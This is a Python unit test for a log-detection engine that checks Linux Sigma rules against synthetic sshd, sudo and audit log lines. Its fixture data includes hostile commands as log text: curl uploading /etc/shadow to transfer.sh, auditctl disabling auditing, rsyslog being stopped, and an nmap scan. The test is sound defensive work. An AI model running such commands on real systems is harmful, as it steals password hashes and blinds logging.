"""Linux pack rules compile, then match ingested sshd and sudo lines.

Native auth.log text goes through parse_payload, engine.ingest, and engine.scan_events.
A hit is the stored row: source, user, event type, host, and evidence id. A look-alike
that quotes the same command or service does not match. Curl to a file host is stored
and matches nothing in this pack: a tool name on a command line is not a transfer.
"""

import unittest
from datetime import datetime, timezone
from pathlib import Path

from watchpost import engine, sigma
from watchpost.db import connect, init_schema
from watchpost.normalize import parse_payload

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "linux"
NOW = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
SOURCE = "linux-auth"
LOGSOURCE_WARNING = "logsource is informational only: the rule runs on every stored event"

# filename, rule id, sigma uuid, severity, techniques, labels that must match.
CASES = [
    (
        "direct_root_ssh.yml",
        "sigma_linux_direct_root_ssh_on_private_address",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100002",
        "high",
        ("T1078.003",),
        {"root-10", "root-172", "root-192", "root-127", "root-ula", "root-linklocal", "root-localhost6"},
    ),
    (
        "ssh_login_from_external.yml",
        "sigma_linux_nonprivileged_ssh_from_external_address",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100001",
        "medium",
        ("T1133",),
        {"deploy-external", "deploy-publickey"},
    ),
    (
        "ssh_invalid_user.yml",
        "sigma_linux_ssh_authentication_for_invalid_user",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100004",
        "medium",
        ("T1110.001",),
        {"invalid-oracle", "invalid-admin"},
    ),
    (
        "sudo_or_su_shell.yml",
        "sigma_linux_sudo_to_interactive_shell",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100003",
        "high",
        ("T1548.003",),
        {"sudo-bash", "sudo-python3"},
    ),
    (
        "network_scanner.yml",
        "sigma_linux_network_scanner_execution",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100005",
        "medium",
        ("T1046",),
        {"sudo-nmap", "audit-nmap"},
    ),
    (
        "logging_audit_tamper.yml",
        "sigma_linux_logging_disable_command",
        "7f3a1c90-2b64-4e17-9d08-a11c0e100007",
        "high",
        ("T1685",),
        {"sudo-auditctl", "sudo-stop-rsyslog"},
    ),
]

# A completed transfer and a web exploit payload are not in this pack.
OMITTED = ("exfil_web_service.yml", "web_exploit_payload.yml")

_AUTH_LINES = [
    ("root-external", "Sep 14 10:00:00 bastion01 sshd[2101]: Accepted password for root from 203.0.113.50 port 50122 ssh2"),
    ("admin-external", "Sep 14 10:01:00 bastion01 sshd[2102]: Accepted publickey for admin from 198.51.100.8 port 50122 ssh2"),
    ("root-10", "Sep 14 10:03:00 bastion01 sshd[2104]: Accepted password for root from 10.1.2.3 port 50122 ssh2"),
    ("root-172", "Sep 14 10:04:00 bastion01 sshd[2105]: Accepted password for root from 172.16.4.4 port 50122 ssh2"),
    ("root-192", "Sep 14 10:05:00 bastion01 sshd[2106]: Accepted password for root from 192.168.1.9 port 50122 ssh2"),
    ("root-127", "Sep 14 10:06:00 bastion01 sshd[2107]: Accepted password for root from 127.0.0.1 port 50122 ssh2"),
    ("root-ula", "Sep 14 10:07:00 bastion01 sshd[2108]: Accepted password for root from fd00::1 port 50122 ssh2"),
    ("root-linklocal", "Sep 14 10:08:00 bastion01 sshd[2109]: Accepted password for root from fe80::1 port 50122 ssh2"),
    ("root-localhost6", "Sep 14 10:09:00 bastion01 sshd[2110]: Accepted password for root from ::1 port 50122 ssh2"),
    ("root-cgnat", "Sep 14 10:10:00 bastion01 sshd[2111]: Accepted password for root from 100.64.1.8 port 50122 ssh2"),
    ("failed-root", "Sep 14 10:11:00 bastion01 sshd[2112]: Failed password for root from 10.1.2.3 port 50122 ssh2"),
    ("deploy-external", "Sep 14 10:12:00 bastion01 sshd[2113]: Accepted password for deploy from 203.0.113.50 port 50122 ssh2"),
    ("deploy-publickey", "Sep 14 10:13:00 bastion01 sshd[2114]: Accepted publickey for deploy from 2001:db8::50 port 50122 ssh2"),
    ("deploy-private", "Sep 14 10:14:00 bastion01 sshd[2115]: Accepted password for deploy from 10.0.1.24 port 50122 ssh2"),
    ("deploy-ula", "Sep 14 10:15:00 bastion01 sshd[2116]: Accepted password for deploy from fd00::9 port 50122 ssh2"),
    ("deploy-failed", "Sep 14 10:16:00 bastion01 sshd[2117]: Failed password for deploy from 203.0.113.50 port 50122 ssh2"),
    ("deploy-hostname", "Sep 14 10:17:00 bastion01 sshd[2118]: Accepted password for deploy from jump.example port 50122 ssh2"),
    ("invalid-oracle", "Sep 14 10:18:00 bastion01 sshd[2119]: Invalid user oracle from 203.0.113.9 port 50122"),
    ("invalid-admin", "Sep 14 10:19:00 bastion01 sshd[2120]: Failed password for invalid user admin from 198.51.100.8 port 50122 ssh2"),
    ("preauth-invalid", "Sep 14 10:20:00 bastion01 sshd[2121]: Connection closed by invalid user admin 203.0.113.9 port 22 [preauth]"),
    ("sudo-bash", "Sep 14 16:05:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/bash"),
    ("sudo-python3", "Sep 14 16:06:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/python3 -c 'print(1)'"),
    ("sudo-nginx", "Sep 14 16:07:00 web01 sudo: grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx"),
    ("sudo-sha256", "Sep 14 16:08:00 web01 sudo: frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/sha256sum /etc/passwd"),
    ("su-root", "Sep 14 16:09:00 web01 su: (to root) frank on /dev/pts/1"),
    ("sudo-session", "Sep 14 16:11:00 web01 sudo: pam_unix(sudo:session): session opened for user root by frank(uid=0)"),
    ("sudo-nmap", "Sep 14 16:15:00 web01 sudo: grace : TTY=pts/1 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24"),
    ("audit-nmap", 'Sep 14 11:00:00 web01 audit[1]: type=SYSCALL arch=c000003e syscall=59 success=yes exe="/usr/bin/nmap" AUID="frank"'),
    ("sudo-auditctl", "Sep 14 16:23:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/sbin/auditctl -e 0"),
    ("sudo-stop-rsyslog", "Sep 14 16:24:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog"),
    ("sudo-status-auditd", "Sep 14 16:25:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl status auditd"),
    ("sudo-restart-rsyslog", "Sep 14 16:26:00 web01 sudo: frank : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart rsyslog"),
    ("sudo-curl", "Sep 14 16:30:00 web01 sudo: frank : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T /etc/shadow https://transfer.sh/shadow"),
    ("note-tools", "Sep 14 16:40:00 web01 logger: ticket 441 mentions COMMAND=/bin/bash, auditctl -e 0, systemctl stop rsyslog, nmap, and transfer.sh"),
]
_WEB_NMAP = (
    '203.0.113.80 - - [14/Sep/2026:13:00:00 +0000] "GET / HTTP/1.1" '
    '200 120 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"'
)


class LinuxPackTests(unittest.TestCase):
    def test_pack_keeps_distinct_auth_and_sudo_rules(self):
        names = sorted(path.name for path in PACK.glob("*.yml"))
        self.assertEqual(names, sorted(case[0] for case in CASES))
        for omitted in OMITTED:
            self.assertFalse((PACK / omitted).exists(), omitted)

        compiled = {}
        for filename, rule_id, sigma_id, severity, techniques, hits in CASES:
            rule = sigma.compile_rule((PACK / filename).read_text())
            self.assertEqual(rule["rule_id"], rule_id)
            self.assertEqual(rule["rule_id"], sigma.slug(rule["title"]))
            self.assertEqual(rule["sigma_id"], sigma_id)
            self.assertEqual(rule["severity"], severity)
            self.assertEqual(tuple(item["id"] for item in rule["techniques"]), techniques)
            self.assertNotIn("T1562.006", [item["id"] for item in rule["techniques"]])
            self.assertIn(LOGSOURCE_WARNING, rule["warnings"])
            self.assertTrue(hits)
            compiled[rule_id] = rule

        conn = connect(":memory:")
        self.addCleanup(conn.close)
        init_schema(conn)
        ids = self._ingest(conn, "authlog", SOURCE, _AUTH_LINES)
        ids.update(self._ingest(conn, "weblog", "web-edge", [("web-nmap", _WEB_NMAP)]))

        max_id = conn.execute("SELECT COALESCE(MAX(id), 0) FROM events").fetchone()[0]
        projected, history, _ = engine.scan_events(conn, [], max_id)
        self.assertEqual(history, [])
        by_id = {event["id"]: event for event in projected}
        self.assertEqual(set(by_id), set(ids.values()))

        matched = {}
        for filename, rule_id, sigma_id, severity, techniques, hits in CASES:
            found = set()
            for finding in sigma.run(projected, compiled[rule_id]["params"]):
                found.update(finding["event_ids"])
            labels = {label for label, event_id in ids.items() if event_id in found}
            with self.subTest(rule=filename):
                self.assertEqual(labels, hits)
            matched[rule_id] = found

        self._pin(by_id, ids, "root-10", source=SOURCE, user="root", event_type="auth_success",
                  host="bastion01", src_ip="10.1.2.3", dest_port=None)
        self._pin(by_id, ids, "deploy-external", source=SOURCE, user="deploy", event_type="auth_success",
                  host="bastion01", src_ip="203.0.113.50", dest_port=None)
        self._pin(by_id, ids, "invalid-oracle", source=SOURCE, user="oracle", event_type="auth_failure",
                  host="bastion01", src_ip="203.0.113.9", dest_port=None)
        self._pin(by_id, ids, "sudo-bash", source=SOURCE, user="frank", event_type="privilege_escalation",
                  host="web01", dest_port=None)
        self._pin(by_id, ids, "sudo-nmap", source=SOURCE, user="grace", event_type="privilege_escalation",
                  host="web01")
        self._pin(by_id, ids, "audit-nmap", source=SOURCE, user="frank", event_type="process_start",
                  host="web01")
        self._pin(by_id, ids, "sudo-auditctl", source=SOURCE, user="frank", event_type="privilege_escalation",
                  host="web01")
        self._pin(by_id, ids, "sudo-nginx", source=SOURCE, user="grace", event_type="privilege_escalation",
                  host="web01")
        self._pin(by_id, ids, "sudo-curl", source=SOURCE, user="frank", event_type="privilege_escalation",
                  host="web01")
        self._pin(by_id, ids, "sudo-session", source=SOURCE, user="root", event_type="privilege_use",
                  host="web01")
        self._pin(by_id, ids, "su-root", source=SOURCE, user="frank", event_type="privilege_escalation",
                  host="web01")
        self._pin(by_id, ids, "preauth-invalid", source=SOURCE, user="admin", event_type="other",
                  host="bastion01", src_ip="203.0.113.9")
        self._pin(by_id, ids, "note-tools", source=SOURCE, user=None, event_type="other", host="web01")
        self._pin(by_id, ids, "web-nmap", source="web-edge", event_type="web_scan", src_ip="203.0.113.80")

        bash = by_id[ids["sudo-bash"]]
        self.assertIn("USER=root ", bash["message"])
        self.assertNotEqual(bash["user"], "root")
        self.assertIn(ids["sudo-bash"], matched["sigma_linux_sudo_to_interactive_shell"])
        self.assertNotIn(ids["sudo-nginx"], matched["sigma_linux_sudo_to_interactive_shell"])
        self.assertNotIn(ids["su-root"], matched["sigma_linux_sudo_to_interactive_shell"])
        self.assertNotIn(ids["note-tools"], matched["sigma_linux_logging_disable_command"])
        self.assertNotIn(ids["sudo-status-auditd"], matched["sigma_linux_logging_disable_command"])
        self.assertNotIn(ids["sudo-restart-rsyslog"], matched["sigma_linux_logging_disable_command"])
        self.assertNotIn(ids["web-nmap"], matched["sigma_linux_network_scanner_execution"])
        self.assertNotIn(ids["preauth-invalid"], matched["sigma_linux_ssh_authentication_for_invalid_user"])
        pack_ids = set().union(*matched.values())
        self.assertNotIn(ids["sudo-curl"], pack_ids)
        self.assertNotIn(ids["note-tools"], pack_ids)
        self.assertIn("transfer.sh", by_id[ids["sudo-curl"]]["message"])

    def _pin(self, by_id, ids, label, **fields):
        event = by_id[ids[label]]
        self.assertEqual(event["id"], ids[label], label)
        for key, value in fields.items():
            self.assertEqual(event[key], value, label)

    def _ingest(self, conn, fmt, source, lines):
        text = "\n".join(line for _, line in lines)
        events, rejections = parse_payload(text, fmt, source, year=2026, now=NOW)
        self.assertEqual(rejections, [], rejections)
        result = engine.ingest(conn, events, rejections, source, fmt, "tester")
        self.assertEqual(result["detection"]["status"], "ok", result["detection"])
        rows = conn.execute("SELECT id FROM events WHERE batch_id = ? ORDER BY id",
                            (result["batch_id"],)).fetchall()
        self.assertEqual(len(rows), len(lines), source)
        return {label: row["id"] for label, row in zip([label for label, _ in lines], rows)}
